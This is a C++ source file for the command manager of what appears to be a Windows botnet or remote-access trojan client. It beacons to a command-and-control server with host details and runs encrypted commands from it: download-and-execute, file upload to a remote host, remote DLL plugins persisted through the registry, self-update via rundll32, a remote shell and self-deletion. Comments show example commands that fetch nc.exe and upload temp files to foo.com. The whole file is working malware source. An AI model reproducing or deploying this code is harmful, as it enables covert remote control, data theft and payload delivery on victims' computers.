/*
 * Author: thirdstormofcythraul@outlook.com
 */
#include "Command_Manager.h"

#include <cstdio>
#include <string>
#include <tchar.h>

#include "print.h"
#include "info.h"
#include "global.h"
#include "http_helper.h"
#include "cshell.h"
#include "macro.h"
#include "Decoder.h"
#include "cshell.h"
#include "register.h"
#include "plugin_loader.h"

#include "memory_debug.h"

// commands :
// stop
//
// kill
//
// download_and_execute
// uri
// local filename
// args
//
// download
// uri
// local filename
//
// update
// uri
// local filename
//
// execute
// file
// args
//
// shell
// port
//
// wait 
// seconds
//
// plug
// uri
// local filename
//
// end

// exemples:
//	"1",
//	"execute",
//	"cmd.exe",
//	"/C ping -n 100 192.168.0.11",
//	"end"

//	"8",
//	"execute",
//	"C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
//	"\"www.google.com\"",
//	" ",
//	"stop",
//	"end"

//	"9",
//	"download",
//	"foo.com/bar/nc.exe",
//	"nc.exe",
//	"end"

// "wait"
// "10000"

// upload
// foo.com/upload.php
// %temp%\\bar.txt
// bar.txt

// plug
// foo.com/plug.dll
// filename
bool CommandManager::executeCommands(LPSTR *commands){
	if (commands == 0){
		return false;
	}
	Register reg;
	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
	TCHAR* key = TEXT("lastc");
	m_lastcommand = reg.getKeyAsInt(path, key, 0);

	int i = 0;	
	while(isToken(i, commands)){
		std::string command = getNextToken(i, commands);

		if (i == 1){
			char * pEnd;
			long value = strtol (command.c_str(), &pEnd, 10);
			if (value == 0){
				return false;
			}
			if (value <= m_lastcommand){
				return true;
			}
			m_lastcommand = value;
			reg.createStringKey(HKEY_CURRENT_USER, path, key, command.c_str());
		} else if (command.compare("end") == 0) {
			return true;
		} else if (command.compare("stop") == 0) {
			stop();
			return true;
		} else if (command.compare("download_and_execute") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string url = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string filename = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string arguments = getNextToken(i, commands);
			downloadAndExecute(url.c_str(), filename.c_str(), arguments.c_str());
		} else if (command.compare("upload") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string url = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string localfile = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string remotefile = getNextToken(i, commands);
			uploadFile(url, localfile, remotefile);
		} else if (command.compare("plug") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string url = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string filename = getNextToken(i, commands);
			plug(url.c_str(), filename.c_str());
		} else if (command.compare("download") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string url = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string filename = getNextToken(i, commands);
			download(url.c_str(), filename.c_str());
		} else if (command.compare("kill") == 0) {
			kill();
			return true;
		} else if (command.compare("update") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string url = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string filename = getNextToken(i, commands);
			update(url.c_str(), filename.c_str());
		} else if (command.compare("execute") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string filename = getNextToken(i, commands);
			if (!isToken(i, commands)){
				return false;
			}
			std::string args = getNextToken(i, commands);
			execute(filename.c_str(), args.c_str());
		} else if (command.compare("shell") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string port = getNextToken(i, commands);
			char * pEnd;
			long value = strtol (port.c_str(), &pEnd, 10);
			if (value == 0){
				return false;
			}
			openShellInNewThread(value);
		} else if (command.compare("wait") == 0) {
			if (!isToken(i, commands)){
				return false;
			}
			std::string timeout = getNextToken(i, commands);
			char * pEnd;
			long value = strtol (timeout.c_str(), &pEnd, 10);
			if (value == 0){
				return false;
			}
			Sleep(value);
		}
	}
	return true;
}

DWORD WINAPI CommandManager::connectToCCLoop(LPVOID args){
	char buffer[BUFFER_STRING_SIZE];
	int i = 0;

	CCLoop_t* arguments = (CCLoop_t*)args;
	const char *filename = arguments->filename;
	const char *version = arguments->version;
	int wait = arguments->wait;


	CommandManager manager;
	while(Global::get().isRunning()){
		std::string allInfos = Info::getAllInfos();
		DWORD uid = 123456;
		if (!Info::getUniqueId(uid)){
			MYPRINTF("unable to get unique id\n");
		}

		const char *ccurl = arguments->serversUrl[i].c_str();
		sprintf_s(buffer, BUFFER_STRING_SIZE, "%s/command.php?v=%s&uid=%u&%s", ccurl, version, uid, allInfos.c_str());


		HttpHelper httpHelper;
		MYPRINTF("connect to C&C: %s\n", buffer);
		LPSTR * commands = httpHelper.get(buffer);
		if (commands != 0){			
			if (!manager.executeCommands(commands)){
				MYPRINTF("cant execute commands from CC\n");
			}
			LPSTR current = commands[0];
			int i = 0;
			while(current != 0) {
				i++;
				delete[] current;
				current = commands[i];
			}
			delete[] commands;
		}

		i++;
		if (i >= arguments->nbServers){
			i = 0;
		}

		DWORD res = WaitForSingleObject(Global::get().SERVICE_RUNNING_EVENT, wait);
		if (res == WAIT_OBJECT_0){
			return 0;
		}
	}
	return 0;
}

bool CommandManager::isToken(int &index, LPSTR *commands){
	return commands[index] != 0 && isNumeric(commands[index]);
}

std::string CommandManager::getNextToken(int &index, LPSTR *commands){	
	Decoder decoder;
	std::string decoded = decoder.rsaDecode(commands[index]);
	MYPRINTF("command received: %s\n", decoded.c_str());
	index++;
	return decoded;
}

DWORD WINAPI openShell(LPVOID params){
	int * value = (int *)params;
	Shell::openShell(*value);
	delete value;
	return 1;
}

void CommandManager::openShellInNewThread(int port){
	int *hport = new int;
	*hport = port;
	CreateThread(NULL, 0, openShell, hport, 0, 0);
}

bool CommandManager::isNumeric(LPSTR str){
	for(unsigned int i = 0;i < strlen(str); i++){
		if (!isdigit(str[i])) {
			if (str[i] != ' '){
				return false;
			}
		}
	}
	return true;
}

bool CommandManager::uploadFile(std::string uri, std::string localname, std::string remotename){
	HttpHelper helper;
	char *response = 0;
	int responseSize = 0;
	DWORD uid;
	if (Info::getUniqueId(uid)){
		std::string s = std::to_string((_Longlong)uid);	
		if (uri.find("?") != std::string::npos){
			uri.append("&uid=").append(s);
		} else {
			uri.append("?uid=").append(s);
		}
	}
	bool res = helper.uploadFile(uri.c_str(), localname.c_str(), remotename.c_str(), &response, responseSize);
	free(response);
	return res;

}

bool CommandManager::downloadAndExecute(const char *uri, const char *filename, const char *arguments){
	HttpHelper httpHelper;
	httpHelper.download(uri, filename);
	Shell::execute(filename, arguments);
	return true;
}

bool CommandManager::download(const char *uri, const char *filename){
	HttpHelper httpHelper;
	httpHelper.download(uri, filename);
	return true;
}

bool CommandManager::plug(const char *uri, const char *filename){
	HttpHelper httpHelper;
	httpHelper.download(uri, filename);

	TCHAR* path = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\");
	TCHAR* key = TEXT("Plugs");
	Register reg;
	std::string plugs = reg.getKey(path, key);
	if (plugs.empty()){
		plugs = filename;
	} else {
		plugs.append(",");
		plugs.append(filename);
			
	}
	reg.createStringKey(HKEY_CURRENT_USER, path, key, plugs.c_str());

	PluginLoader::getInstance().load(filename);
	return true;
}

bool CommandManager::execute(const char *filename, const char *arguments){
	Shell::execute(filename, arguments);
	return true;
}


bool CommandManager::update(const char *uri, const char *filename){
	HttpHelper httpHelper;
	httpHelper.download(uri, filename);
	char buffer[128];
	sprintf_s(buffer, COUNTOF(buffer), " %s InstallService", filename);
	Shell::execute("rundll32.exe", buffer);
	return true;
}

bool CommandManager::stop(){
	Global::get().stopRunning();
	return true;
}

bool CommandManager::removeService(){
	return RemoveService(0, 0, 0, 0) == 0;

}

bool CommandManager::kill(){

	Shell::killAtNextReboot();
	removeService();
	Global::get().stopRunning();
	Shell::deleteCurrent();
	return true;
}



